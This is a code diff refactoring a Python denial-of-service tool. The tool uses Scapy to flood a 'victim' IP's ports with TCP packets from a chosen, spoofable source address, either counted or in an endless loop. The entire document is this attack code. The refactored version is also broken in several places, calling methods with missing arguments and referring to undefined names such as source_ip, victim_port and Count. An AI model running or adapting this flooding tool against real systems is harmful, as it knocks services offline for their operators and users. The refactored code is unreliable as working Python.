@@ -1,47 +1,63 @@
-def run(Source_IP: str, Victim_IP: str, Source_Port: int, Victim_Ports: list, Count: int, Message: str):
-    print("Scapy Needs Administrator Permission")
-    print("UAC Will Run On Windows")
-    from scapy.all import sendp as Send, TCP as tcp, IP as ip
-    from time import sleep as Sleep
-    from random import choice
+class Run:
+    def __init__(self, source: tuple, victim : tuple, count: int, message: str):
+        global send,TCP,IP,random
+        from scapy.all import sendp as send, TCP, IP
+        from random import choice
+        self.source_ip, self.source_port = source
+        self.victim_ip, self.victim_ports = victim
+        print("Scapy Needs Administrator Permission")
+        print("UAC Will Run On Windows Or On linux call ZKit with sudo")
+        print("Press Ctrl + C To Stop The Process")
+        if count in ('-1', -1):
+            self.infinite_dos()
+        else:
+            self.counted_dos()
 
-    if Count == -1:
+    def build_packet(self, ip, protocol, data):
+        self.packet = ip / protocol / data
+
+    def build_ip(self, src, dst):
+        self.ip = IP(src=source_ip, dst=victim_ip)
+
+    def ready_the_protocol(self):
+        self.tcp = TCP(sport=source_port, dport=(
+            victim_port))
+
+    def random_port(self):
+        self.victim_port = int(choice(self.victim_ports))
+
+    def report(self):
+        print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
+            self.victim_ip, self.source_ip, self.source_port, self.victim_port))
+
+    def infinite_dos(self):
         i = 0
         while True:
             try:
-                print("Press Ctrl + C To Stop The Process")
-                IP = ip(src=Source_IP, dst=Victim_IP)
-                Victim_Port = int(choice(Victim_Ports))
-                TCP = tcp(sport=Source_Port, dport=(
-                    Victim_Port))
-                Packet = IP / TCP / Message
-                Send(Packet)
-                print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
-                    Victim_IP, Source_IP, Source_Port, Victim_Port))
+                self.ready_the_protocol()
+                self.random_port()
+                self.build_packet(ip, tcp, message)
+                self.build_ip()
+                send(self.packet)
+                self.report()
                 i += 1
             except KeyboardInterrupt:
                 print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
-                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
-                Sleep(2)
-                raise SystemExit
+                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
+                break
 
-    else:
-        print("Press Ctrl + C To Stop The Process")
+    def counted_dos(self):
         for i in range(0, Count):
             try:
-                IP = ip(src=Source_IP, dst=Victim_IP)
-                Victim_Port = int(choice(Victim_Ports))
-                TCP = tcp(sport=Source_Port, dport=(
-                    Victim_Port))
-                Packet = IP / TCP / Message
-                Send(Packet)
-                print("Sent Packet To Target {} from IP {} And Port {} To Port {}".format(
-                    Victim_IP, Source_IP, Source_Port, Victim_Port))
+                self.ready_the_protocol()
+                self.random_port()
+                self.build_packet(ip, tcp, message)
+                self.build_ip()
+                send(self.packet)
+                self.report()
             except KeyboardInterrupt:
-                print("Already Sent {} Packets To Target {} from IP {} And Port {} To Port {}".format(
-                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
+                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
+                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                 break
-                Sleep(2)
-                raise SystemExit
         print("Operation Was Successful. Sent {} Packets To {}".format(
-            Count, Victim_Port))
+            self.count, self.victim_ip))
